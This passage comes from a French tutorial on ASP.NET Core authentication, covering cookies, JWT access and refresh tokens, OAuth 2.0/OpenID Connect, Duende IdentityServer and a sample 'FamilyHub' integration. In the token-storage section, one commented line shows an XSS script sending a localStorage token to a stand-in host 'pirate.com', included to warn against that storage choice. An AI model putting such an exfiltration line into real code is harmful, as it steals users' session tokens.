    options.AccessDeniedPath = "/access-denied";
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.ExpireTimeSpan = TimeSpan.FromHours(8);
});

// 3. Ajouter les services Blazor avec authentification
builder.Services.AddRazorComponents()
    .AddInteractiveServerComponents();

builder.Services.AddCascadingAuthenticationState(); // Pour Blazor

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapRazorComponents<App>()
    .AddInteractiveServerRenderMode();

app.Run();
```

```razor
@* App.razor - Ajouter CascadingAuthenticationState *@
<CascadingAuthenticationState>
    <Router AppAssembly="typeof(App).Assembly">
        <Found Context="routeData">
            <AuthorizeRouteView RouteData="routeData" DefaultLayout="typeof(MainLayout)">
                <NotAuthorized>
                    <RedirectToLogin />
                </NotAuthorized>
            </AuthorizeRouteView>
        </Found>
    </Router>
</CascadingAuthenticationState>
```

```razor
@* Pages protegees avec [Authorize] *@
@page "/tasks"
@attribute [Authorize]

<h3>Mes Taches</h3>

<AuthorizeView>
    <Authorized>
        <p>Bienvenue, @context.User.Identity?.Name !</p>
    </Authorized>
</AuthorizeView>
```

---

# PARTIE 3 - JWT (JSON Web Tokens)

## 3.1 Qu'est-ce qu'un JWT ?

Un JWT (prononce "jot") est un token signe qui contient des informations (claims) sur un utilisateur. C'est comme un passeport numerique : il contient vos informations d'identite et est signe par une autorite de confiance.

### Structure d'un JWT

Un JWT est compose de trois parties separees par des points :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
|____________Header_____________|.|_______________Payload________________|.|_____________Signature______________|
```

**1. Header** (en-tete) - Base64 encode :
```json
{
  "alg": "HS256",   // Algorithme de signature (HMAC SHA-256)
  "typ": "JWT"      // Type de token
}
```

**2. Payload** (charge utile) - Base64 encode :
```json
{
  "sub": "user-123",                      // Subject (ID utilisateur)
  "name": "Alice Dupont",                 // Nom
  "email": "alice@familyhub.com",         // Email
  "role": "Admin",                        // Role
  "familyId": "family-456",              // Claim personnalise
  "iat": 1700000000,                     // Issued At (date de creation)
  "exp": 1700003600,                     // Expiration (1 heure apres)
  "iss": "https://familyhub.com",        // Issuer (qui a emis le token)
  "aud": "https://api.familyhub.com"     // Audience (pour qui est le token)
}
```

**3. Signature** - Verifie l'integrite du token :
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

> **Important** : Le payload d'un JWT est encode en Base64, PAS chiffre ! N'importe qui peut le decoder et lire les informations. Ne mettez JAMAIS de donnees sensibles (mots de passe, numeros de carte bancaire) dans un JWT. La signature garantit uniquement que le contenu n'a pas ete modifie.

---

## 3.2 Fonctionnement du JWT (flux visuel)

```
┌──────────────────────────────────────────────────────────────────────┐
│                          FLUX JWT                                    │
│                                                                      │
│  1. LOGIN                                                            │
│  ┌──────────┐    POST /login           ┌──────────────┐             │
│  │  Client  │ ──────────────────────►  │   Serveur    │             │
│  │  (Blazor)│    {email, password}     │   (API)      │             │
│  │          │ ◄──────────────────────  │              │             │
│  │          │    {accessToken,         │  Verifie le  │             │
│  │          │     refreshToken}        │  mot de passe│             │
│  └──────────┘                          │  Genere JWT  │             │
│       │                                └──────────────┘             │
│       │ Stocke les tokens                                           │
│       │                                                              │
│  2. REQUETES AUTHENTIFIEES                                          │
│  ┌──────────┐    GET /api/tasks        ┌──────────────┐             │
│  │  Client  │ ──────────────────────►  │   Serveur    │             │
│  │          │    Authorization:        │              │             │
│  │          │    Bearer eyJhbG...      │  Verifie la  │             │
│  │          │ ◄──────────────────────  │  signature   │             │
│  │          │    [liste des taches]    │  du JWT      │             │
│  └──────────┘                          └──────────────┘             │
│                                                                      │
│  3. TOKEN EXPIRE                                                     │
│  ┌──────────┐    POST /refresh         ┌──────────────┐             │
│  │  Client  │ ──────────────────────►  │   Serveur    │             │
│  │          │    {refreshToken}        │              │             │
│  │          │ ◄──────────────────────  │  Verifie le  │             │
│  │          │    {newAccessToken,      │  refresh     │             │
│  │          │     newRefreshToken}     │  token       │             │
│  └──────────┘                          └──────────────┘             │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3.3 Access Tokens vs Refresh Tokens

| Caracteristique | Access Token | Refresh Token |
|----------------|-------------|---------------|
| **Duree de vie** | Courte (15-60 min) | Longue (jours/semaines) |
| **Contenu** | Claims de l'utilisateur | Identifiant opaque ou JWT |
| **Utilisation** | Envoye a chaque requete API | Utilise uniquement pour obtenir un nouvel access token |
| **Stockage** | Memoire / Cookie HttpOnly | Cookie HttpOnly / base de donnees |
| **Revocation** | Difficile (stateless) | Facile (stocke en BDD) |

### Pourquoi deux tokens ?

- L'**access token** est court pour limiter les degats en cas de vol
- Le **refresh token** permet de rester connecte sans redemander le mot de passe
- Si un access token est vole, il expire vite (15 minutes)
- Si un refresh token est vole, on peut le revoquer en base de donnees

```csharp
// Generation des tokens
public class TokenService
{
    private readonly IConfiguration _config;

    public string GenerateAccessToken(FamilyHubUser user, IList<string> roles)
    {
        var claims = new List<Claim>
        {
            new(ClaimTypes.NameIdentifier, user.Id),
            new(ClaimTypes.Name, user.FullName),
            new(ClaimTypes.Email, user.Email!),
            new("FamilyId", user.FamilyId ?? ""),
        };

        // Ajouter les roles comme claims
        claims.AddRange(roles.Select(role => new Claim(ClaimTypes.Role, role)));

        var key = new SymmetricSecurityKey(
            Encoding.UTF8.GetBytes(_config["Jwt:SecretKey"]!));
        var credentials = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

        var token = new JwtSecurityToken(
            issuer: _config["Jwt:Issuer"],
            audience: _config["Jwt:Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddMinutes(30), // Courte duree !
            signingCredentials: credentials
        );

        return new JwtSecurityTokenHandler().WriteToken(token);
    }

    public string GenerateRefreshToken()
    {
        var randomNumber = new byte[64];
        using var rng = RandomNumberGenerator.Create();
        rng.GetBytes(randomNumber);
        return Convert.ToBase64String(randomNumber);
    }
}
```

---

## 3.4 Validation et extraction des claims

```csharp
// Configuration de la validation JWT dans Program.cs
services.AddAuthentication(options =>
{
    options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
})
.AddJwtBearer(options =>
{
    options.TokenValidationParameters = new TokenValidationParameters
    {
        // Valider la signature
        ValidateIssuerSigningKey = true,
        IssuerSigningKey = new SymmetricSecurityKey(
            Encoding.UTF8.GetBytes(builder.Configuration["Jwt:SecretKey"]!)),

        // Valider l'emetteur
        ValidateIssuer = true,
        ValidIssuer = builder.Configuration["Jwt:Issuer"],

        // Valider l'audience
        ValidateAudience = true,
        ValidAudience = builder.Configuration["Jwt:Audience"],

        // Valider l'expiration
        ValidateLifetime = true,
        ClockSkew = TimeSpan.FromMinutes(1), // Tolerance de 1 minute
    };
});
```

### Extraire les claims dans un endpoint

```csharp
app.MapGet("/api/me", (ClaimsPrincipal user) =>
{
    var userId = user.FindFirstValue(ClaimTypes.NameIdentifier);
    var name = user.FindFirstValue(ClaimTypes.Name);
    var email = user.FindFirstValue(ClaimTypes.Email);
    var roles = user.FindAll(ClaimTypes.Role).Select(c => c.Value);
    var familyId = user.FindFirstValue("FamilyId");

    return Results.Ok(new
    {
        UserId = userId,
        Name = name,
        Email = email,
        Roles = roles,
        FamilyId = familyId
    });
}).RequireAuthorization();
```

---

## 3.5 Expiration et renouvellement des tokens

```csharp
// Endpoint de renouvellement des tokens
app.MapPost("/api/auth/refresh", async (
    RefreshTokenRequest request,
    TokenService tokenService,
    UserManager<FamilyHubUser> userManager,
    ApplicationDbContext context) =>
{
    // 1. Trouver le refresh token en base de donnees
    var storedToken = await context.RefreshTokens
        .FirstOrDefaultAsync(t => t.Token == request.RefreshToken);

    if (storedToken == null || storedToken.ExpiresAt < DateTime.UtcNow)
        return Results.Unauthorized();

    // 2. Verifier que le token n'a pas ete revoque
    if (storedToken.IsRevoked)
        return Results.Unauthorized();

    // 3. Trouver l'utilisateur
    var user = await userManager.FindByIdAsync(storedToken.UserId);
    if (user == null) return Results.Unauthorized();

    // 4. Generer de nouveaux tokens
    var roles = await userManager.GetRolesAsync(user);
    var newAccessToken = tokenService.GenerateAccessToken(user, roles);
    var newRefreshToken = tokenService.GenerateRefreshToken();

    // 5. Revoquer l'ancien refresh token et sauvegarder le nouveau
    storedToken.IsRevoked = true;
    context.RefreshTokens.Add(new RefreshTokenEntity
    {
        Token = newRefreshToken,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddDays(7),
        CreatedAt = DateTime.UtcNow
    });
    await context.SaveChangesAsync();

    return Results.Ok(new { AccessToken = newAccessToken, RefreshToken = newRefreshToken });
});
```

---

## 3.6 Ou stocker les tokens ?

C'est une question cruciale pour la securite !

### Option 1 : localStorage (DECONSEILLE)

```javascript
// DANGEREUX - Accessible depuis JavaScript -> vulnerable au XSS
localStorage.setItem('accessToken', token);

// Un script XSS malveillant peut voler le token :
// fetch('https://pirate.com/steal?token=' + localStorage.getItem('accessToken'));
```

### Option 2 : Cookie HttpOnly (RECOMMANDE)

```csharp
// Le serveur envoie le token dans un cookie securise
Response.Cookies.Append("access_token", token, new CookieOptions
{
    HttpOnly = true,      // Inaccessible depuis JavaScript !
    Secure = true,         // HTTPS uniquement
    SameSite = SameSiteMode.Strict, // Protection CSRF
    Expires = DateTimeOffset.UtcNow.AddMinutes(30)
});
```

### Comparaison

| Critere | localStorage | Cookie HttpOnly |
|---------|-------------|----------------|
| Accessible depuis JS | Oui (dangereux) | Non (securise) |
| Protection XSS | Non | Oui |
| Protection CSRF | Oui (pas envoye auto) | Besoin de SameSite |
| Taille max | ~5 MB | ~4 KB |
| Envoye automatiquement | Non (header manuel) | Oui (automatique) |

> **Recommandation** : Utilisez des cookies HttpOnly + Secure + SameSite pour stocker les tokens. C'est la methode la plus securisee.

---

## 3.7 Implementation JWT dans ASP.NET Core

### Configuration complete

```json
// appsettings.json
{
  "Jwt": {
    "SecretKey": "VotreCleSecreteSuperLongueEtComplexeAvecAuMoins32Caracteres!",
    "Issuer": "https://familyhub.com",
    "Audience": "https://api.familyhub.com",
    "AccessTokenExpirationMinutes": 30,
    "RefreshTokenExpirationDays": 7
  }
}
```

```csharp
// Program.cs - Configuration JWT complete
builder.Services.AddAuthentication(options =>
{
    options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
})
.AddJwtBearer(options =>
{
    options.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuerSigningKey = true,
        IssuerSigningKey = new SymmetricSecurityKey(
            Encoding.UTF8.GetBytes(builder.Configuration["Jwt:SecretKey"]!)),
        ValidateIssuer = true,
        ValidIssuer = builder.Configuration["Jwt:Issuer"],
        ValidateAudience = true,
        ValidAudience = builder.Configuration["Jwt:Audience"],
        ValidateLifetime = true,
        ClockSkew = TimeSpan.FromMinutes(1)
    };

    // Pour SignalR / Blazor Server : lire le token depuis le cookie
    options.Events = new JwtBearerEvents
    {
        OnMessageReceived = context =>
        {
            // Essayer de lire le token depuis le cookie
            context.Token = context.Request.Cookies["access_token"];
            return Task.CompletedTask;
        }
    };
});
```

---

## 3.8 Implementation de IUserContext avec JWT

Dans notre projet pragmatic-architecture, `IUserContext` retourne actuellement `User.Unknown`. Avec JWT, nous pouvons le connecter aux vrais claims de l'utilisateur.

```csharp
// Rappel : l'interface existante dans le projet
// src/Domain/Users/IUserContext.cs
namespace TodoApp.Domain.Users;
public interface IUserContext
{
    User CurrentUser { get; }
}

// AVANT : retourne toujours User.Unknown
// src/Api/Services/UserContext.cs
public class UserContext : IUserContext
{
    public User CurrentUser => User.Unknown;
}

// APRES : recupere l'utilisateur depuis les claims JWT
public class JwtUserContext : IUserContext
{
    private readonly IHttpContextAccessor _httpContextAccessor;

    public JwtUserContext(IHttpContextAccessor httpContextAccessor)
    {
        _httpContextAccessor = httpContextAccessor;
    }

    public User CurrentUser
    {
        get
        {
            var claimsPrincipal = _httpContextAccessor.HttpContext?.User;

            if (claimsPrincipal?.Identity?.IsAuthenticated != true)
                return User.Unknown;

            var id = claimsPrincipal.FindFirstValue(ClaimTypes.NameIdentifier) ?? "Unknown";
            var firstName = claimsPrincipal.FindFirstValue(ClaimTypes.GivenName) ?? "Unknown";
            var lastName = claimsPrincipal.FindFirstValue(ClaimTypes.Surname) ?? "Unknown";

            var user = new User(id, firstName, lastName);

            // Mapper les roles des claims vers notre enum Role
            var roles = claimsPrincipal.FindAll(ClaimTypes.Role).Select(c => c.Value);
            foreach (var role in roles)
            {
                if (Enum.TryParse<Role>(role, out var parsedRole))
                {
                    user.Roles |= parsedRole;
                }
            }

            user.SubscriptionLevel = claimsPrincipal.FindFirstValue("SubscriptionLevel");
            user.Country = claimsPrincipal.FindFirstValue("Country");

            return user;
        }
    }
}

// Enregistrement dans le DI container
services.AddHttpContextAccessor();
services.AddScoped<IUserContext, JwtUserContext>();
```

---

# PARTIE 4 - OAuth 2.0 & OpenID Connect

## 4.1 Qu'est-ce que OAuth 2.0 ?

### L'analogie du valet parking

Imaginez que vous arrivez dans un hotel de luxe avec votre voiture :

- Vous donnez une **cle de valet** au voiturier (pas votre cle principale)
- Cette cle permet UNIQUEMENT de demarrer la voiture et d'ouvrir la portiere
- Elle ne permet PAS d'ouvrir le coffre ou la boite a gants
- Le voiturier a un **acces limite** a votre voiture

**OAuth 2.0 fonctionne exactement pareil :**
- Votre application (le voiturier) demande un acces limite a un service (votre voiture)
- L'utilisateur (vous) autorise cet acces
- L'application recoit un **token d'acces** (la cle de valet) avec des permissions limitees
- L'application n'a JAMAIS acces a votre mot de passe (votre cle principale)

```
┌────────────────────────────────────────────────────────────────┐
│                        OAuth 2.0                               │
│                                                                │
│  ┌───────────┐                         ┌──────────────────┐   │
│  │ Resource   │  "Puis-je acceder      │ Authorization     │   │
│  │ Owner      │   a vos photos ?"      │ Server            │   │
│  │ (Vous)     │◄──────────────────────│ (Google)           │   │
│  │            │  "Oui, j'autorise"     │                   │   │
│  │            │──────────────────────►│                    │   │
│  └───────────┘                         │  Genere un token  │   │
│                                        │  d'acces          │   │
│  ┌───────────┐   Token d'acces         └──────────────────┘   │
│  │ Client     │◄──────────────────────                        │
│  │ (FamilyHub)│                                               │
│  │            │   Acces aux photos     ┌──────────────────┐   │
│  │            │──────────────────────►│ Resource Server    │   │
│  │            │◄──────────────────────│ (Google Photos)    │   │
│  │            │   Photos de l'user     └──────────────────┘   │
│  └───────────┘                                                │
└────────────────────────────────────────────────────────────────┘
```

### Les 4 roles d'OAuth 2.0

| Role | Description | Exemple |
|------|-------------|---------|
| **Resource Owner** | L'utilisateur qui possede les donnees | Vous |
| **Client** | L'application qui veut acceder aux donnees | FamilyHub |
| **Authorization Server** | Le serveur qui delivre les tokens | Google Auth |
| **Resource Server** | Le serveur qui heberge les donnees protegees | Google Photos API |

---

## 4.2 Les flux OAuth 2.0

### Authorization Code Flow (le plus securise pour les apps web)

C'est le flux standard pour les applications web avec un backend.

```
1. L'utilisateur clique "Se connecter avec Google"
2. Redirection vers Google :
   https://accounts.google.com/authorize?
     client_id=FAMILYHUB_ID&
     redirect_uri=https://familyhub.com/callback&
     response_type=code&
     scope=openid email profile

3. L'utilisateur se connecte sur Google et autorise FamilyHub
4. Google redirige vers FamilyHub avec un code :
   https://familyhub.com/callback?code=AUTHORIZATION_CODE

5. Le BACKEND de FamilyHub echange le code contre des tokens :
   POST https://oauth2.googleapis.com/token
   {
     "code": "AUTHORIZATION_CODE",
     "client_id": "FAMILYHUB_ID",
     "client_secret": "FAMILYHUB_SECRET",  // Secret ! Jamais expose au client !
     "redirect_uri": "https://familyhub.com/callback",
     "grant_type": "authorization_code"
   }

6. Google repond avec les tokens :
   {
     "access_token": "ya29...",
     "refresh_token": "1//04...",
     "id_token": "eyJhbG...",  // JWT avec les infos de l'utilisateur
     "expires_in": 3600
   }
```

### Authorization Code Flow with PKCE (pour les SPA et apps mobiles)

PKCE (Proof Key for Code Exchange, prononce "pixy") est une extension de securite pour les applications qui ne peuvent pas garder un secret (SPA, apps mobiles).

```
1. Le client genere un code_verifier aleatoire et calcule un code_challenge
   code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
   code_challenge = SHA256(code_verifier) = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

2. Redirection vers le serveur d'autorisation avec le code_challenge :
   /authorize?...&code_challenge=E9Melh...&code_challenge_method=S256

3. Le serveur stocke le code_challenge

4. Lors de l'echange du code, le client envoie le code_verifier original :
   POST /token { "code_verifier": "dBjftJeZ...", ... }

5. Le serveur verifie que SHA256(code_verifier) == code_challenge stocke
```

**Pourquoi ?** Meme si quelqu'un intercepte le code d'autorisation, il ne peut pas l'echanger sans le `code_verifier` original.

### Client Credentials Flow (machine-to-machine)

Pour la communication entre services (pas d'utilisateur implique).

```csharp
// Service A veut appeler Service B
var client = new HttpClient();
var tokenResponse = await client.RequestClientCredentialsTokenAsync(
    new ClientCredentialsTokenRequest
    {
        Address = "https://auth.familyhub.com/connect/token",
        ClientId = "service-a",
        ClientSecret = "secret-de-service-a",
        Scope = "api.familyhub"
    });

// Utiliser le token pour appeler Service B
client.SetBearerToken(tokenResponse.AccessToken);
var response = await client.GetAsync("https://api.familyhub.com/tasks");
```

---

## 4.3 OpenID Connect (OIDC)

OAuth 2.0 est concu pour l'**autorisation** (acces aux ressources), pas pour l'**authentification** (qui est l'utilisateur). OpenID Connect ajoute une couche d'identite par-dessus OAuth 2.0.

```
┌──────────────────────────────────────────────────────────┐
│                                                          │
│    ┌──────────────────────────────────────────────┐     │
│    │          OpenID Connect (OIDC)                │     │
│    │       (couche d'identite)                    │     │
│    │                                              │     │
│    │    - ID Token (JWT avec infos utilisateur)   │     │
│    │    - UserInfo endpoint                       │     │
│    │    - Scopes standards (openid, profile,      │     │
│    │      email)                                  │     │
│    │                                              │     │
│    │    ┌──────────────────────────────────────┐  │     │
│    │    │         OAuth 2.0                     │  │     │
│    │    │    (couche d'autorisation)            │  │     │
│    │    │                                      │  │     │
│    │    │    - Access Token                     │  │     │
│    │    │    - Refresh Token                    │  │     │
│    │    │    - Scopes personnalises             │  │     │
│    │    └──────────────────────────────────────┘  │     │
│    └──────────────────────────────────────────────┘     │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### ID Token vs Access Token

| Caracteristique | ID Token | Access Token |
|----------------|----------|-------------|
| **Format** | Toujours un JWT | JWT ou opaque |
| **Contient** | Identite de l'utilisateur (nom, email) | Permissions d'acces |
| **Audience** | L'application client | L'API / Resource Server |
| **Utilisation** | Authentifier l'utilisateur | Acceder aux ressources protegees |
| **Envoye a** | L'application | L'API via le header Authorization |

```json
// Exemple d'ID Token decode
{
  "iss": "https://accounts.google.com",     // Emetteur
  "sub": "110169484474386276334",            // Identifiant unique
  "aud": "familyhub-client-id",             // Pour quelle application
  "exp": 1700003600,                         // Expiration
  "iat": 1700000000,                         // Date de creation
  "name": "Alice Dupont",                    // Nom complet
  "email": "alice@gmail.com",               // Email
  "email_verified": true,                    // Email verifie
  "picture": "https://lh3.google.com/..."   // Photo de profil
}
```

---

## 4.4 Fournisseurs externes : Google, Microsoft, GitHub

### Configuration dans ASP.NET Core

```bash
# Packages NuGet necessaires
dotnet add package Microsoft.AspNetCore.Authentication.Google
dotnet add package Microsoft.AspNetCore.Authentication.MicrosoftAccount
dotnet add package AspNet.Security.OAuth.GitHub
```

```csharp
// Program.cs
builder.Services.AddAuthentication(options =>
{
    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = GoogleDefaults.AuthenticationScheme;
})
.AddCookie()
.AddGoogle(options =>
{
    options.ClientId = builder.Configuration["Authentication:Google:ClientId"]!;
    options.ClientSecret = builder.Configuration["Authentication:Google:ClientSecret"]!;
    options.Scope.Add("profile");
    options.Scope.Add("email");

    // Mapper les claims Google vers nos claims
    options.ClaimActions.MapJsonKey(ClaimTypes.GivenName, "given_name");
    options.ClaimActions.MapJsonKey(ClaimTypes.Surname, "family_name");
    options.ClaimActions.MapJsonKey("picture", "picture");
})
.AddMicrosoftAccount(options =>
{
    options.ClientId = builder.Configuration["Authentication:Microsoft:ClientId"]!;
    options.ClientSecret = builder.Configuration["Authentication:Microsoft:ClientSecret"]!;
})
.AddGitHub(options =>
{
    options.ClientId = builder.Configuration["Authentication:GitHub:ClientId"]!;
    options.ClientSecret = builder.Configuration["Authentication:GitHub:ClientSecret"]!;
    options.Scope.Add("user:email");
});
```

```json
// appsettings.json (NE PAS commiter les secrets !)
// Utiliser dotnet user-secrets en developpement
{
  "Authentication": {
    "Google": {
      "ClientId": "votre-client-id.apps.googleusercontent.com",
      "ClientSecret": "votre-client-secret"
    },
    "Microsoft": {
      "ClientId": "votre-client-id",
      "ClientSecret": "votre-client-secret"
    },
    "GitHub": {
      "ClientId": "votre-client-id",
      "ClientSecret": "votre-client-secret"
    }
  }
}
```

```bash
# Stocker les secrets en dev avec user-secrets (jamais dans le code source !)
dotnet user-secrets set "Authentication:Google:ClientId" "votre-client-id"
dotnet user-secrets set "Authentication:Google:ClientSecret" "votre-secret"
```

### Comment obtenir les credentials ?

**Google :**
1. Aller sur https://console.cloud.google.com
2. Creer un projet
3. Activer l'API "Google Identity"
4. Creer des identifiants OAuth 2.0 (type "Application Web")
5. Ajouter `https://localhost:5001/signin-google` comme URI de redirection

**GitHub :**
1. Aller dans Settings > Developer Settings > OAuth Apps
2. Creer une nouvelle OAuth App
3. Authorization callback URL : `https://localhost:5001/signin-github`

**Microsoft :**
1. Aller sur https://portal.azure.com > Azure Active Directory
2. App registrations > New registration
3. Redirect URI : `https://localhost:5001/signin-microsoft`

---

# PARTIE 5 - Duende IdentityServer

## 5.1 Qu'est-ce que Duende IdentityServer ?

Duende IdentityServer (anciennement IdentityServer4) est un framework OpenID Connect et OAuth 2.0 pour ASP.NET Core. Il vous permet de creer votre **propre serveur d'identite**.

### Quand en avez-vous besoin ?

| Scenario | Solution | Besoin de Duende ? |
|----------|----------|-------------------|
| Application simple avec login | ASP.NET Core Identity seul | Non |
| Login Google/Microsoft seulement | External auth providers | Non |
| Plusieurs applications avec SSO | Duende IdentityServer | **Oui** |
| API protegees pour des clients externes | Duende IdentityServer | **Oui** |
| Microservices avec auth centralisee | Duende IdentityServer | **Oui** |
| Conformite entreprise (OAuth/OIDC strict) | Duende IdentityServer | **Oui** |

### Analogie

Imaginez que vous gerez un campus universitaire avec plusieurs batiments (applications). Au lieu d'avoir un badge different pour chaque batiment, vous avez **un seul badge** qui fonctionne partout. Duende IdentityServer est le bureau de securite central qui emet ces badges.

---

## 5.2 Concepts cles

### Clients

Un **client** est une application qui demande des tokens a IdentityServer.

```csharp
// Configuration d'un client
new Client
{
    ClientId = "familyhub-blazor",
    ClientName = "FamilyHub Blazor App",
    AllowedGrantTypes = GrantTypes.Code,  // Authorization Code + PKCE
    RequirePkce = true,

    RedirectUris = { "https://familyhub.com/callback" },
    PostLogoutRedirectUris = { "https://familyhub.com/" },

    AllowedScopes =
    {
        IdentityServerConstants.StandardScopes.OpenId,
        IdentityServerConstants.StandardScopes.Profile,
        IdentityServerConstants.StandardScopes.Email,
        "familyhub.api"
    }
}
```

### Resources (Ressources)

Les **ressources** sont ce que vous voulez proteger :

```csharp
// Identity Resources : informations sur l'utilisateur
new IdentityResource[]
{
    new IdentityResources.OpenId(),   // Subject ID (obligatoire)
    new IdentityResources.Profile(), // Nom, prenom, etc.
    new IdentityResources.Email(),   // Email
};

// API Scopes : permissions sur les APIs
new ApiScope[]
{
    new ApiScope("familyhub.api", "FamilyHub API"),
    new ApiScope("familyhub.tasks.read", "Lecture des taches"),
    new ApiScope("familyhub.tasks.write", "Ecriture des taches"),
};

// API Resources : les APIs elles-memes
new ApiResource[]
{
    new ApiResource("familyhub-api", "FamilyHub API")
    {
        Scopes = { "familyhub.api", "familyhub.tasks.read", "familyhub.tasks.write" }
    }
};
```

### Scopes

Les **scopes** definissent le niveau d'acces demande :

```
openid          -> Identifiant de l'utilisateur (obligatoire pour OIDC)
profile         -> Nom, prenom, photo
email           -> Adresse email
familyhub.api   -> Acces a l'API FamilyHub
```

---

## 5.3 Mise en place de Duende avec ASP.NET Core

### Installation

```bash
dotnet new isempty -n IdentityServer  # Template Duende
# ou
dotnet add package Duende.IdentityServer
dotnet add package Duende.IdentityServer.AspNetIdentity
```

### Configuration

```csharp
// Program.cs du projet IdentityServer
var builder = WebApplication.CreateBuilder(args);

// Ajouter ASP.NET Core Identity
builder.Services.AddIdentity<FamilyHubUser, IdentityRole>()
    .AddEntityFrameworkStores<ApplicationDbContext>()
    .AddDefaultTokenProviders();

// Ajouter Duende IdentityServer
builder.Services.AddIdentityServer(options =>
{
    options.Events.RaiseErrorEvents = true;
    options.Events.RaiseInformationEvents = true;
    options.Events.RaiseFailureEvents = true;
    options.Events.RaiseSuccessEvents = true;
})
.AddInMemoryIdentityResources(Config.IdentityResources)
.AddInMemoryApiScopes(Config.ApiScopes)
.AddInMemoryClients(Config.Clients)
.AddAspNetIdentity<FamilyHubUser>();  // Integration avec ASP.NET Core Identity

var app = builder.Build();

app.UseIdentityServer();  // Active IdentityServer (remplace UseAuthentication)
app.UseAuthorization();

app.Run();
```

---

## 5.4 Proteger les APIs avec Duende

```csharp
// Dans le projet API FamilyHub
builder.Services.AddAuthentication("Bearer")
    .AddJwtBearer("Bearer", options =>
    {
        options.Authority = "https://localhost:5001"; // URL d'IdentityServer
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateAudience = false  // Ou specifier l'audience
        };
    });

builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ApiScope", policy =>
    {
        policy.RequireAuthenticatedUser();
        policy.RequireClaim("scope", "familyhub.api");
    });
});

// Appliquer la policy aux endpoints
app.MapGet("/api/tasks", GetTasks).RequireAuthorization("ApiScope");
```

---

## 5.5 Single Sign-On (SSO)

Le SSO permet a un utilisateur de se connecter une seule fois et d'acceder a toutes les applications sans se reconnecter.

```
┌──────────────┐                         ┌──────────────────┐
│  FamilyHub   │──── "Qui suis-je ?" ──►│                  │
│  (Blazor)    │◄─── Token ────────────│  Duende           │
└──────────────┘                         │  IdentityServer  │
                                         │                  │
┌──────────────┐                         │  Session unique  │
│  FamilyHub   │──── "Qui suis-je ?" ──►│  de l'utilisateur│
│  (Mobile)    │◄─── Token (auto!) ─────│                  │
└──────────────┘                         └──────────────────┘

L'utilisateur ne se connecte qu'UNE SEULE FOIS sur IdentityServer.
Toutes les applications recoivent automatiquement un token.
```

---

## 5.6 Licences

| Edition | Usage | Cout |
|---------|-------|------|
| **Community** | Projets open source, dev/test | Gratuit |
| **Starter** | Petites entreprises (< 1M$ CA) | Payant (abordable) |
| **Business** | Moyennes entreprises | Payant |
| **Enterprise** | Grandes entreprises | Payant (premium) |

> **Alternative gratuite** : Pour un projet etudiant ou open source, la version Community est parfaite. En production commerciale, evaluez les couts par rapport a des alternatives comme Auth0, Azure AD B2C, ou Keycloak (open source).

---

# PARTIE 6 - Integration dans FamilyHub

## 6.1 Ajouter .NET Identity a FamilyHub

Voici comment integrer l'authentification dans notre projet fil rouge FamilyHub, en suivant l'architecture existante.

### Etape 1 : Modifier le modele User existant

```csharp
// AVANT : src/Domain/Users/User.cs (notre modele actuel)
namespace TodoApp.Domain.Users;
public class User
{
    public string Id { get; set; }
    public string FirstName { get; set; }
    public string LastName { get; set; }
    // ...
}

// APRES : On cree un FamilyHubUser qui herite d'IdentityUser
// src/Domain/Users/FamilyHubUser.cs
using Microsoft.AspNetCore.Identity;

namespace FamilyHub.Domain.Users;

public class FamilyHubUser : IdentityUser
{
    public string FirstName { get; set; } = string.Empty;
    public string LastName { get; set; } = string.Empty;
    public string? FamilyId { get; set; }
    public string FullName => $"{FirstName} {LastName}";

    // Convertir vers notre modele domain User
    public User ToDomainUser()
    {
        var user = new User(Id, FirstName, LastName);
        return user;
    }
}
```

### Etape 2 : Modifier le DbContext

```csharp
// src/Infrastructure/Database/ApplicationDbContext.cs
using Microsoft.AspNetCore.Identity.EntityFrameworkCore;

namespace FamilyHub.Infrastructure.Database;

public class ApplicationDbContext : IdentityDbContext<FamilyHubUser>
{
    public ApplicationDbContext(DbContextOptions<ApplicationDbContext> options)
        : base(options) { }

    public DbSet<TaskItem> Tasks { get; set; }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder); // Important pour Identity !
        modelBuilder.ApplyConfigurationsFromAssembly(Assembly.GetExecutingAssembly());
    }
}
```

### Etape 3 : Configurer les services

```csharp
// src/Api/ServiceCollectionExtensions.cs
public static IServiceCollection AddApi(this IServiceCollection services, IConfiguration configuration)
{
    services.AddIdentity<FamilyHubUser, IdentityRole>(options =>
    {
        options.Password.RequiredLength = 8;
        options.Password.RequireDigit = true;
        options.Password.RequireUppercase = true;
        options.Password.RequireNonAlphanumeric = false; // Pour simplifier en dev
        options.Lockout.MaxFailedAccessAttempts = 5;
        options.User.RequireUniqueEmail = true;
    })
    .AddEntityFrameworkStores<ApplicationDbContext>()
    .AddDefaultTokenProviders();

    services.AddHttpContextAccessor();
    services.AddScoped<IUserContext, JwtUserContext>();

    return services;
}
```

---

## 6.2 Composants Blazor Login/Register

### Page de Login

```razor
@page "/login"
@using Microsoft.AspNetCore.Identity
@inject SignInManager<FamilyHubUser> SignInManager
@inject NavigationManager Navigation

